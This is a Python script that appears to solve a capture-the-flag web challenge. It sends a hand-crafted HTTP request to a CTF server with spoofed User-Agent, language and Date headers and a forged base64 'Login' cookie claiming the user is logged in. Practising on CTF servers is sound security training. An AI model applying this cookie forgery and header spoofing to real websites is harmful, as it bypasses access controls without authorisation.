import socket
import time

with socket.socket() as client:
    host = "holesomebirthdayparty.ctf.umasscybersec.org"
    client.connect((host, 80))

    client.send(
b"""GET / HTTP/1.1\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r
Accept-Language: fr-CH,fr;q=0.9\r
Cache-Control: max-age=0\r
Connection: keep-alive\r
Host: """ + host.encode() + b"""\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Bikini Bottom\r
Date: Sun, 14 Jul 2024 22:00:00 UTC\r
Cookie: flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9\r
\r
""")
    time.sleep(0.5)
    site = str(client.recv(2048)).replace("\\n", "\n")

print(site)
